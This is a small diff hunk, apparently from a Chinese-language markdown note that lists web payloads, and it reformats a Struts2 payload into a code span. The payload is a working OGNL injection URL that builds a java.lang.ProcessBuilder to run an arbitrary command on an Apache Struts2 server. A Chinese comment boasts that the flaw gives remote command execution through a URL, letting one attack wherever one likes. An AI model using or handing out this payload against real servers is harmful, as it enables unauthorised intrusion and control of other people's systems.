@@ -48,7 +48,7 @@ JBoss Payload:
 
 Struts2 Payload:
 
-	/action?action:%25{%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start()}
+`/action?action:%25{%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start()}`
 
 Struts2漏洞的影响大家都懂的, 通过URL直接远程命令执行, 想打那里就打那里.
 
